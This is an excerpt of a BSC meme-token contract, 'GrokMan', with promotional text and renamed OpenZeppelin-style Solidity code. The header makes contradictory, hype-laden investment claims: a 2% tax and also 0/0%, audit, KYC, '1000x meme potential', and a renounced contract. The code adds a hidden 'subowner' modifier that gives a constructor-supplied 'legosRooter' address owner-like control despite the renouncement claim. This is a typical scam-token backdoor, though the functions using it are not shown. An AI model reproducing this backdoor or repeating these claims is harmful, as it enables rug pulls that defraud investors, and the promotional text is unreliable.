...
GrokMan |  Grokman on BSC | 

GrokMan is a fan token for the GrokMan project, which has gained significant attention in the crypto community. The token has several features and benefits that make it an attractive investment opportunity:

Audit: 
The token has undergone a fan token audit, ensuring transparency and security for investors

KYC: 
Know Your Customer (KYC) procedures have been implemented to verify the identity of token holders, adding an extra layer of trust

Experienced Team: 
The GrokMan team has a strong background in the crypto industry, increasing investor confidence

Strong Team: 
The token is associated with a Strong team, adding a unique and engaging aspect to the project

Fast Tracked: 
GrokMan has been fast-tracked on CMC and CG, indicating its commitment to delivering high-quality content and services

Contract Renounced on Launch: The token's contract has been renounced on launch, ensuring fair distribution and transparency

Media Releases: 
GrokMan has an active presence on various media platforms, including Twitter, YouTube, and Instagram, allowing for effective promotion and community engagement

Meme Potential: 
The token has the potential to become a meme, which could significantly increase its value and popularity

Buy & Sell Tax:
GrokMan imposes a 2% tax on both buys and sells, providing a sustainable funding model for the project

LP Locked: 
The liquidity pool for GrokMan is locked for one year, ensuring long-term commitment and stability
...
CMC Fast Tracked 
| CG Fast Tracked 
| Contract Renounced on Launch ⚠️
 | CMC+CG, Dextools, Dexview, Dexscreener, Avedex, Twitter, 
 BSC Bot Trends, 4chan trending at the launch📄 |
 Media Releases 📄
🚀 1000x Meme Potential 🚀 
Buy & Sell tax: 0/0% 🌕, 
Lp LOCKED 1 year 🔐,
...
https://GrokMan.io/
https://t.me/GrokManToken
https://twitter.com/GrokManToken
*/
...
/*
 * @dev Provides information about the current execution GrokMan20Burnable, including the
 ...
 */
abstract contract GrokMan20Burnable {
...
// File: @openzeppelin/contracts/access/GrokMan20Ownable.sol
 ...
 * the owner.
 */
abstract contract GrokMan20Ownable is GrokMan20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "GrokMan20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "GrokMan20Ownable: new owner is the zero address");
 ...
 * `SafeGrokMan` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeGrokMan {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGrokMan: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGrokMan: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeGrokMan: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGrokMan: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGrokMan: modulo by zero");
  }
...
contract GrokManToken is GrokMan20Burnable, GrokMan33, GrokMan20Ownable {
    
    using SafeGrokMan for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "GrokMan";
        _decimals = 9;
        _totalSupply = 8989890000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    string public GrokMantelegramcchannel = "https://t.me/GrokManToken";
            function getGrokMantelegramcchannel() public view returns (string memory) {
        return GrokMantelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {GrokMan33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "GrokMan20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {GrokMan33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {GrokMan33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {GrokMan33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "GrokMan33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {GrokMan33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "GrokMan33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "GrokMan33: transfer from the zero address");
        require(shippingto != address(0), "GrokMan33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "GrokMan33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "GrokMan33: approve from the zero address");
        require(transporteur != address(0), "GrokMan33: approve to the zero address");
